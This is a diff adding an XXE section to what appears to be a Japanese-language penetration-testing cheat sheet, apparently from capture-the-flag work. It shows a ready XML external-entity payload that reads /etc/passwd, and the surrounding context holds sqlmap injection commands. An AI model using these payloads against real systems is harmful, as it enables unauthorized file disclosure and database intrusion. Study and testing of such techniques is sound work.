@@ -444,6 +444,21 @@ sqlmap -u http://192.168.56.1/vuln.php?id=1
 sqlmap -u http：//192.168.0.1/vuln.php?id=1 --user-agent "Mozilla / 5.0（X11; Linux x86_64; rv：60.0 ）Gecko / 20100101 Firefox / 60.0 "
 ```
 
+### XXE(XML external entitiy)
+下のエクスプロイトでは、&xxe;と記述した箇所でfile:///etc/passwdを実行させている。
+```
+<?xml  version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE data [
+<!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+		<bugreport>
+		<title>test</title>
+		<cwe>test</cwe>
+		<cvss>test</cvss>
+		<reward>&xxe;</reward>
+		</bugreport>
+```
+
 ### SSTI(サーバサイドテンプレートインジェクション)
 ![](./image/2021-04-14-15-23-34.png)
 
